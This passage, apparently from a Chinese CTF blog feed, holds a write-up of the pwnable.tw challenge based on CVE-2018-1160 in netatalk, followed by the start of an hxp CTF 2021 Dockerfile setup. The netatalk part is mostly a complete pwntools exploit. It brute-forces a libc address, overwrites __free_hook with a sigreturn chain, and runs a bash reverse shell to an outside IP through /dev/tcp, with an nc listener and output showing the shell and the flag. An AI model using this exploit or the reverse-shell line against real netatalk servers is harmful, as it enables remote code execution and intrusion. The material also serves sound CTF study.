class="token number">10002</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    <span class="token keyword">return</span> headerdata <span class="token operator">=</span> <span class="token string">""</span>data <span class="token operator">+=</span> <span class="token string">"aaaa"</span><span class="token comment"># attn_quantum</span>data <span class="token operator">+=</span> <span class="token string">"bbbb"</span><span class="token comment"># datasize</span>data <span class="token operator">+=</span> <span class="token string">"blog"</span><span class="token comment"># server_quantum</span>tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmpp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搜索一下标记字符串”blog”：</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; search blog[heap]          0x55b9d5142b30 0x10000676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;uams_dhx2_passwd.so 0x7fb63a7d3241 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk-3.1.11&#x2F;etc&#x2F;uams&#39;uams_dhx_passwd.so 0x7fb63ae9b625 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk-3.1.11&#x2F;etc&#x2F;uams&#39;[anon_7fb640583] 0x7fb64058301a 0x676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[anon_7fb6406a8] 0x7fb6406a84b6 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;.&#39;[stack]         0x7ffc23cfda25 0x47445800676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfda74 0x53454400676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfdb23 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#39;[stack]         0x7ffc23cfdb59 0x554f4a00676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfde0f 0x55424400676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfdef0 &#39;blog&#x2F;.local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存放结构体的堆应该位于 <code>0x55b9d5142b00</code>。commonds指针指向的地址为 <code>0x00007fb640583010</code>：</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10xg 0x55b9d5142b000x55b9d5142b00:0x00000000000000000x000000000000001e0x55b9d5142b10:0x00000000000000000x00000000000000000x55b9d5142b20:0x00000000000000000x62626262616161610x55b9d5142b30:0x00010000676f6c620x00007fb6405830100x55b9d5142b40:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vmmap观察一下周围的内存情况：</p><pre class="line-numbers language-none"><code class="language-none">0x7fb63f7d7000     0x7fb63f9be000 r-xp   1e7000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63f9be000     0x7fb63fbbe000 ---p   200000 1e7000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63fbbe000     0x7fb63fbc2000 r--p     4000 1e7000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63fbc2000     0x7fb63fbc4000 rw-p     2000 1eb000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63fbc4000     0x7fb63fbc8000 rw-p     4000 0      [anon_7fb63fbc4]0x7fb63fbc8000     0x7fb63fbe2000 r-xp    1a000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fbe2000     0x7fb63fde1000 ---p   1ff000 1a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fde1000     0x7fb63fde2000 r--p     1000 19000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fde2000     0x7fb63fde3000 rw-p     1000 1a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fde3000     0x7fb63fde7000 rw-p     4000 0      [anon_7fb63fde3]0x7fb63fde7000     0x7fb63fdee000 r-xp     7000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63fdee000     0x7fb63ffed000 ---p   1ff000 7000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63ffed000     0x7fb63ffee000 r--p     1000 6000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63ffee000     0x7fb63ffef000 rw-p     1000 7000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63ffef000     0x7fb63fff2000 r-xp     3000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb63fff2000     0x7fb6401f1000 ---p   1ff000 3000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb6401f1000     0x7fb6401f2000 r--p     1000 2000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb6401f2000     0x7fb6401f3000 rw-p     1000 3000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb6401f3000     0x7fb640271000 r-xp    7e000 0      &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640271000     0x7fb640470000 ---p   1ff000 7e000  &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640470000     0x7fb640471000 r--p     1000 7d000  &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640471000     0x7fb640473000 rw-p     2000 7e000  &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640473000     0x7fb640481000 rw-p     e000 0      [anon_7fb640473]0x7fb640481000     0x7fb6404aa000 r-xp    29000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so0x7fb640583000     0x7fb640684000 rw-p   101000 0      [anon_7fb640583]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>既然commonds指针指向的位置在libcbase的后面，那么我们可以在保证地址值是0x1000的整数倍的前提下，从高到低逐位爆破出一个可写的地址，再用这个地址去每次减0x1000枚举libcbase。在上面的vmmap中：只要枚举 (<code>0x7fb6406840000-0x7fb63f7d7000)/0x1000=3757</code>次即可得到libcbase。</p></li><li><p>我们可以在服务器上 <code>sudo nc -lvnp [PORT]</code>监听特定端口，每枚举一个libcbase，就用 <code>bash -c &quot;bash  -i&gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1&quot;</code>去尝试反弹shell，直到成功为止。</p></li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>REMOTE <span class="token operator">=</span> <span class="token boolean">True</span>IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">5566</span>CMD <span class="token operator">=</span> <span class="token string">'bash -c "bash  -i>&amp; /dev/tcp/106.52.6.138/80 0>&amp;1"'</span><span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>    IP <span class="token operator">=</span> <span class="token string">"chall.pwnable.tw"</span>    PORT <span class="token operator">=</span> <span class="token number">10002</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'error'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    <span class="token keyword">return</span> header<span class="token keyword">def</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    leak_addr <span class="token operator">=</span> <span class="token string">"\x00"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>d <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>s0 <span class="token operator">=</span> <span class="token number">255</span><span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x10</span>    s0 <span class="token operator">=</span> <span class="token number">240</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>s0<span class="token punctuation">,</span>d<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    now <span class="token operator">=</span> <span class="token string">""</span>    now <span class="token operator">+=</span> <span class="token string">"aaaa"</span><span class="token comment"># attn_quantum</span>        now <span class="token operator">+=</span> <span class="token string">"bbbb"</span><span class="token comment"># datasize</span>        now <span class="token operator">+=</span> <span class="token string">"blog"</span><span class="token comment"># server_quantum</span>        now <span class="token operator">+=</span> <span class="token string">"dddd"</span><span class="token comment"># serverID, clientID</span>    now <span class="token operator">+=</span> leak_addr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>now<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"golb"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    leak_addr <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span>                    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 0x7f1d23795000</span>    ret <span class="token operator">=</span> u64<span class="token punctuation">(</span>leak_addr<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> endian <span class="token operator">=</span> <span class="token string">"little"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ret  <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> offset    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>    dl_open_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_dl_open_hook"</span><span class="token punctuation">]</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    setcontext_53 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x520A5</span>    libc_dlopen_mode_56 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x166488</span>    fgetpos64_207 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x7EA1F</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token string">""</span>    data <span class="token operator">+=</span> <span class="token string">"aaaa"</span><span class="token comment"># attn_quantum</span>    data <span class="token operator">+=</span> <span class="token string">"bbbb"</span><span class="token comment"># datasize</span>    data <span class="token operator">+=</span> <span class="token string">"blog"</span><span class="token comment"># server_quantum</span>    data <span class="token operator">+=</span> <span class="token string">"dddd"</span><span class="token comment"># serverID, clientID</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>free_hook <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>    sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> system_addr    sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">8</span>                   <span class="token comment"># cmd</span>    sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook                       <span class="token comment"># must be a writable address, as the stack of system func</span>    data <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xF</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>              <span class="token comment"># padding</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_dlopen_mode_56<span class="token punctuation">)</span>            <span class="token comment"># __free_hook, after this rop, rax = *dl_open_hook = dl_open_hook + 8</span>    data <span class="token operator">+=</span> CMD<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2bb8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>          <span class="token comment"># __free_hook + 8</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>dl_open_hook <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>               <span class="token comment"># dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fgetpos64_207<span class="token punctuation">)</span>                <span class="token comment"># _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8</span>    data <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x18</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>setcontext_53<span class="token punctuation">)</span>             <span class="token comment"># dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53</span>      data <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token punctuation">]</span>           <span class="token comment"># now rdi = dl_open_hook + 8, thus we cut the offset from rdi to this pos</span>    payload <span class="token operator">=</span> gen_payload2<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># REMOTE: 0x7f1d2378f000</span>leak_addr <span class="token operator">=</span> bruteforce<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xffff000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    exploit<span class="token punctuation">(</span>leak_addr<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><pre class="line-numbers language-none"><code class="language-none">ubuntu@VM-8-13-ubuntu:~$ sudo nc -lvnp 80Listening on 0.0.0.0 80Connection received on 139.162.123.119 33326bash: cannot set terminal process group (7): Inappropriate ioctl for devicebash: no job control in this shellnetatalk@08e1e5af1e65:&#x2F;$ lslsbinbootdevetchomeliblib64mediamntoptprocrootrunsbinsrvsystmpusrvarnetatalk@08e1e5af1e65:&#x2F;$ cd homecd homenetatalk@08e1e5af1e65:&#x2F;home$ lslsnetatalknetatalk@08e1e5af1e65:&#x2F;home$ cd netatalkcd netatalknetatalk@08e1e5af1e65:&#x2F;home&#x2F;netatalk$ lslsafp.confafpdflaglibatalk.so.18netatalk@08e1e5af1e65:&#x2F;home&#x2F;netatalk$ cat flagcat flagFLAG&#123;ASLR_1s_us3l3ss_0n_f0rk_d43m0n&#125;netatalk@08e1e5af1e65:&#x2F;home&#x2F;netatalk$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hxpCTF-2021</title>
      <link href="/2022/01/12/hxpctf-2021/"/>
      <url>/2022/01/12/hxpctf-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="hxp-CTF-2021"><a href="#hxp-CTF-2021" class="headerlink" title="hxp CTF 2021"></a>hxp CTF 2021</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sandboxgrind"><a href="#sandboxgrind" class="headerlink" title="sandboxgrind"></a>sandboxgrind</h3><ol><li>调试</li></ol><ul><li>给容器更换国内源<pre class="line-numbers language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile">ADD sources.list &#x2F;etc&#x2F;apt&#x2F;# 在 Dockerfile 同目录下创建 sources.list:# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye main non-free contrib# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye main non-free contrib# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; bullseye-security main# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; bullseye-security main# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-updates main non-free contrib# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-updates main non-free contrib# deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-backports main non-free contrib# deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; bullseye-backports main non-free contrib# 如果用 https 的话可能有认证之类的问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>在 Dockerfile 中加入<pre class="line-numbers language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile">RUN apt-get -y updateRUN apt-get install -y gdb gdbserverRUN apt-get install -y procps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>完整 Dockerfile<pre class="line-numbers language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile"># Running locally:# 1) echo &#39;hxp&#123;FLAG&#125;&#39; &gt; flag.txt# 2) docker build -t sandboxgrind .# 3) docker run -p 9001:1024 --privileged --rm --cap-add&#x3D;SYS_ADMIN --security-opt apparmor&#x3D;unconfined -it sandboxgrind#  docker run -p 2001:2001 --privileged --rm --cap-add&#x3D;SYS_ADMIN --security-opt apparmor&#x3D;unconfined -it sandboxgrind &#x2F;bin&#x2F;sh# Move to a new, leaner container for the challengeFROM debian:bullseye# Copy the sandboxCOPY &#x2F;sandboxgrind-build.tar.gz &#x2F;RUN tar -xzf &#x2F;sandboxgrind-build.tar.gz &amp;&amp; \    rm &#x2F;sandboxgrind-build.tar.gz &amp;&amp; \    chown -R root:root &#x2F;sandboxgrind&#x2F; &amp;&amp; \    chmod -R a-w,ug-rx &#x2F;sandboxgrind&#x2F;# Set up ynetdRUN useradd --create-home --shell &#x2F;bin&#x2F;bash ctfCOPY ynetd &#x2F;sbin&#x2F;RUN chmod 555 &#x2F;home&#x2F;ctf&#x2F; &amp;&amp; \    chown -R root:root &#x2F;home&#x2F;ctf&#x2F; &amp;&amp; \    chmod 500 &#x2F;sbin&#x2F;ynetd# Set up flagCOPY flag.txt docker-stuff&#x2F;readflag &#x2F;RUN chown root:1337 &#x2F;flag.txt &#x2F;readflag &amp;&amp; \    chmod 040 &#x2F;flag.txt &amp;&amp; \    chmod 2555 &#x2F;readflag# Set up submission environmentCOPY submission.sh &#x2F;home&#x2F;ctf&#x2F;RUN chmod 005 &#x2F;home&#x2F;ctf&#x2F;submission.sh# We&#39;re paranoidRUN chmod 1703 &#x2F;tmpRUN find &#x2F; -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename &#x2F;readflag -deleteUSER ctfRUN (find --version &amp;&amp; id --version &amp;&amp; sed --version &amp;&amp; grep --version) &gt; &#x2F;dev&#x2F;nullRUN ! find &#x2F; -writable -or -user $(id -un) -or -group $(id -Gn|sed -e &#39;s&#x2F; &#x2F; -or -group &#x2F;g&#39;) 2&gt; &#x2F;dev&#x2F;null | grep -Ev -m 1 &#39;^(&#x2F;dev&#x2F;|&#x2F;run&#x2F;|&#x2F;proc&#x2F;|&#x2F;sys&#x2F;|&#x2F;tmp|&#x2F;var&#x2F;tmp|&#x2F;var&#x2F;lock|&#x2F;var&#x2F;mail|&#x2F;var&#x2F;spool&#x2F;mail)&#39;# RunUSER rootWORKDIR &#x2F;home&#x2F;ctfEXPOSE 1024CMD ynetd -np y -lm -1 -lt 10 -t 15 -sh n -lpid 16 &#x2F;home&#x2F;ctf&#x2F;submission.sh &amp; \    while true; do sleep 20s; find &#x2F;tmp&#x2F; -type f -cmin +1 -delete; done# DebugADD sources.list &#x2F;etc&#x2F;apt&#x2F;RUN apt-get -y updateRUN apt-get install -y gdb gdbserverRUN apt-get install -y procps<span aria-hidden="true" 